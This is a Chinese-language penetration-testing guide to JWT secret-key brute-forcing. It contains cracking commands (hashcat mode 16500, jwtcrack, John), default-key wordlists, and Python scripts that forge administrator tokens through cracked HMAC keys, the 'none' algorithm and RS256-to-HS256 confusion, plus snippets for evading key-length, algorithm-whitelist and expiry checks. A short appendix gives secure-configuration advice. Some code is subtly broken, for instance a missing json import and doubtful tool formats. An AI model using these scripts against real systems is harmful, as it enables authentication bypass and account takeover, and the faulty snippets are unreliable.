# JWT 密钥爆破攻击

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 JWT（JSON Web Token）密钥爆破攻击的系统性方法论。通过本指南，测试人员可以检测 JWT 实现中存在的弱密钥问题，并利用这些漏洞伪造令牌、绕过身份验证。

### 1.2 适用范围
本文档适用于以下场景：
- 使用 HS256/HS384/HS512 签名算法的 JWT 认证系统
- 使用弱密钥或默认密钥的 JWT 实现
- 移动端应用、单页应用（SPA）的 Token 认证
- API 网关的 JWT 验证机制

### 1.3 读者对象
- 渗透测试工程师
- API 安全测试人员
- 移动应用安全测试人员
- 身份认证系统审计人员

---

## 第二部分：核心渗透技术专题

### 专题一：JWT 密钥爆破攻击

#### 2.1 技术介绍

**JWT 密钥爆破攻击**是指攻击者通过暴力破解、字典攻击等方式获取 JWT 签名密钥，从而能够伪造任意 JWT 令牌的攻击技术。

**JWT 结构：**
```
Header.Payload.Signature
```

**签名生成原理：**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

**常见弱密钥来源：**
| 来源类型 | 示例 | 风险等级 |
|---------|------|---------|
| 默认密钥 | `secret`、`your-256-bit-secret` | 严重 |
| 短密钥 | 少于 32 字符的随机串 | 高危 |
| 可预测密钥 | 域名、应用名、时间戳 | 高危 |
| 硬编码密钥 | 代码中固定的密钥 | 严重 |
| 弱随机数 | `rand()` 生成 | 高危 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户认证系统 | 登录后的 Session Token | 使用弱密钥签发 JWT |
| API 认证 | API Key 替代方案 | 密钥硬编码在客户端代码中 |
| 微服务通信 | 服务间身份验证 | 共享弱密钥 |
| 移动端应用 | App 登录令牌 | 密钥可被反编译获取 |
| OAuth 2.0 | 第三方登录 Token | 密钥强度不足 |
| SSO 单点登录 | 跨系统身份传递 | 主密钥泄露影响所有系统 |

#### 2.3 漏洞发现方法

##### 2.3.1 黑盒测试

**步骤 1：识别 JWT Token**
```bash
# JWT 格式识别：三段式 Base64 编码
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# 使用工具解析
jwt decode "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**步骤 2：检查签名算法**
```bash
# 解析 Header 部分
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# 输出：{"alg":"HS256","typ":"JWT"}

# 常见算法类型
# HS256 - HMAC SHA256（可爆破）
# HS384 - HMAC SHA384（可爆破）
# HS512 - HMAC SHA512（可爆破）
# RS256 - RSA SHA256（不可爆破，需私钥）
# ES256 - ECDSA SHA256（不可爆破，需私钥）
```

**步骤 3：检测弱密钥**
```bash
# 使用 jwtcrack 工具
jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# 使用 hashcat 爆破（模式 16500）
hashcat -m 16500 jwt.hash wordlist.txt
```

##### 2.3.2 白盒测试

**检查代码中的硬编码密钥：**
```javascript
// 不安全示例 - JavaScript
const token = jwt.sign(payload, 'my-secret-key');

// 不安全示例 - Python
token = jwt.encode(payload, 'secret', algorithm='HS256')

// 不安全示例 - Java
String secret = "your-256-bit-secret";
```

**检查密钥生成逻辑：**
```python
# 不安全 - 使用弱随机数
import random
secret = ''.join(random.choices(string.ascii_letters, k=16))

# 安全 - 使用加密安全的随机数
import secrets
secret = secrets.token_urlsafe(32)
```

#### 2.4 漏洞利用方法

##### 2.4.1 使用常见密钥字典爆破

```bash
# 创建常见密钥字典
cat > jwt_wordlist.txt << EOF
secret
your-256-bit-secret
your-secret-key
key
password
123456
jwt_secret
token_secret
$(hostname)
$(date +%Y)
EOF

# 使用 jwtcrack 爆破
jwtcrack "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" -w jwt_wordlist.txt

# 使用 hashcat
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > jwt.hash
hashcat -m 16500 jwt.hash jwt_wordlist.txt -o cracked.txt
```

##### 2.4.2 使用 John the Ripper 爆破

```bash
# 提取 JWT 哈希
john --format=HMAC-SHA256 jwt.txt

# 使用字典攻击
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt

# 显示破解结果
john --show jwt.txt
```

##### 2.4.3 伪造 JWT Token

```python
#!/usr/bin/env python3
"""
JWT 伪造工具 - 爆破成功后伪造任意令牌
"""
import jwt
import json

def forge_jwt(token, cracked_secret):
    """使用破解的密钥伪造 JWT"""
    try:
        # 解码原始 token 获取 header
        header = jwt.get_unverified_header(token)
        print(f"[*] Header: {json.dumps(header, indent=2)}")
        
        # 伪造 admin 权限的 payload
        fake_payload = {
            "sub": "admin",
            "name": "Administrator",
            "iat": 1516239022,
            "admin": True,
            "role": "administrator"
        }
        
        # 使用破解的密钥签名新 token
        forged_token = jwt.encode(
            fake_payload,
            cracked_secret,
            algorithm=header.get('alg', 'HS256')
        )
        
        print(f"[+] 伪造的 JWT: {forged_token}")
        return forged_token
        
    except Exception as e:
        print(f"[-] 伪造失败：{e}")

# 使用示例
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
forge_jwt(token, "cracked_secret_key")
```

##### 2.4.4 算法混淆攻击（None Algorithm）

```python
#!/usr/bin/env python3
"""
JWT None 算法攻击 - 当服务器接受 'none' 算法时
"""
import jwt
import base64

def none_algorithm_attack(token):
    """利用 None 算法漏洞"""
    # 解析原始 payload
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改 payload
    payload['admin'] = True
    payload['user_id'] = 1
    
    # 创建使用 none 算法的 token
    header = {"alg": "none", "typ": "JWT"}
    
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # 空签名
    forged_token = f"{header_b64}.{payload_b64}."
    print(f"[+] None 算法伪造的 JWT: {forged_token}")
    return forged_token
```

##### 2.4.5 密钥混淆攻击（RS256 → HS256）

```python
#!/usr/bin/env python3
"""
RS256 转 HS256 攻击 - 当服务器未严格验证算法时
"""
import jwt
import base64

def rs256_to_hs256_attack(token, public_key):
    """
    将 RS256 改为 HS256，使用公钥作为 HMAC 密钥
    前提：服务器未严格验证算法类型
    """
    # 解析原始 payload
    payload = jwt.decode(token, options={"verify_signature": False})
    
    # 修改 payload
    payload['admin'] = True
    
    # 使用公钥作为 HS256 的密钥
    forged_token = jwt.encode(
        payload,
        public_key,
        algorithm='HS256'
    )
    
    print(f"[+] RS256→HS256 伪造的 JWT: {forged_token}")
    return forged_token
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过密钥长度检测

```python
# 当服务器有最小密钥长度检测时
# 方法：使用密钥派生函数生成足够长的密钥

import hashlib

def derive_key(short_key, length=32):
    """使用 PBKDF2 派生长密钥"""
    derived = hashlib.pbkdf2_hmac(
        'sha256',
        short_key.encode(),
        b'salt_value',  # 可能需要尝试不同 salt
        100000
    )
    return derived[:length]
```

##### 2.5.2 绕过算法白名单

```python
# 当服务器限制算法类型时
# 尝试算法家族中的其他成员

# 如果 HS256 被保护，尝试 HS384 或 HS512
algorithms_to_try = ['HS256', 'HS384', 'HS512']

for alg in algorithms_to_try:
    try:
        token = jwt.encode(payload, secret, algorithm=alg)
        # 测试 token 是否被接受
    except:
        pass
```

##### 2.5.3 绕过 Token 过期检测

```python
# 伪造未过期的 token
import time

payload = {
    "sub": "admin",
    "iat": int(time.time()),           # 当前时间
    "exp": int(time.time()) + 86400,   # 24 小时后过期
    "nbf": int(time.time()) - 60       # 1 分钟前生效
}
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 命令/代码 | 说明 |
|-----|----------|------|
| 解析 | `jwt decode <token>` | 解析 JWT 内容 |
| 解析 | `echo <header> \| base64 -d` | 解码 Header |
| 爆破 | `jwtcrack <token> -w wordlist.txt` | 字典爆破 |
| 爆破 | `hashcat -m 16500 jwt.hash wordlist.txt` | Hashcat 爆破 |
| 爆破 | `john --format=HMAC-SHA256 jwt.txt` | John 爆破 |
| 伪造 | `jwt.encode(payload, secret, algorithm='HS256')` | Python 伪造 |
| 攻击 | `alg: none` | None 算法攻击 |
| 攻击 | `RS256 → HS256` | 算法混淆攻击 |

### 3.2 常见默认密钥清单

```
secret
your-256-bit-secret
your-secret-key
key
password
jwt_secret
token_secret
app_secret
auth_key
signature_key
changeme
test
demo
```

### 3.3 JWT 安全配置建议

**Node.js (jsonwebtoken):**
```javascript
// 安全配置
const token = jwt.sign(payload, process.env.JWT_SECRET, {
  algorithm: 'HS256',
  expiresIn: '1h',
  issuer: 'your-domain.com'
});

// 验证时严格检查算法
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  issuer: 'your-domain.com'
});
```

**Python (PyJWT):**
```python
# 安全配置
import os
import jwt

secret = os.environ.get('JWT_SECRET')  # 从环境变量获取
if len(secret) < 32:
    raise ValueError("JWT secret must be at least 32 characters")

token = jwt.encode(
    payload,
    secret,
    algorithm='HS256',
    headers={'kid': 'unique-key-id'}  # 使用 key ID
)
```

**Java (jjwt):**
```java
// 安全配置
SecretKey key = Keys.hmacShaKeyFor(
    DatatypeConverter.parseBase64Binary(secret)
);

String token = Jwts.builder()
    .setClaims(claims)
    .signWith(key, SignatureAlgorithm.HS256)
    .compact();
```

### 3.4 JWT 工具清单

| 工具 | 用途 | 链接 |
|-----|------|------|
| jwt.io | 在线解析/调试 | https://jwt.io |
| jwtcrack | 密钥爆破 | https://github.com/tijme/jwtcrack |
| jwt_tool | 综合测试工具 | https://github.com/ticarpi/jwt_tool |
| Hashcat | 哈希爆破 | https://hashcat.net |
| John the Ripper | 密码破解 | https://www.openwall.com/john |

---

## 参考资源

- [JWT RFC 7519](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Attack Playbook](https://github.com/ticarpi/jwt-tool)
- [Critical Vulnerabilities in JSON Web Token Implementations](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-implementations/)
